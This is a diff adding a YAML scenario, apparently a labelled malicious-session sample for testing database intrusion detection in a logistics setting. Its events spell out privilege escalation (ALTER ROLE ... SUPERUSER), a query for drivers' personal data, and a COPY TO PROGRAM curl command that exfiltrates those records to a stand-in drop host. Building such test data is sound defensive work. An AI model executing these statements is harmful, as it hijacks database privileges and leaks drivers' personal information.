@@ -1,0 +1,23 @@
+scenario_id: logistics_alter_role_esc_0014
+family_id: logistics_alter_role_esc_0014
+domain: logistics
+time_of_day: 03:00
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: escalate
+  role: dispatcher
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.038836121562643
+  events:
+  - sql: ALTER ROLE fleet_manager WITH SUPERUSER
+  - sql: SELECT license_number, home_address, phone, full_name FROM drivers WHERE depot_id != 'DEPOT-CENTRAL'
+  - step_id: exfil
+    sql: COPY (SELECT d.license_number, d.home_address, d.phone FROM drivers d) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'
+    connects_to:
+      ip: 45.33.12.9
+      port: 4444
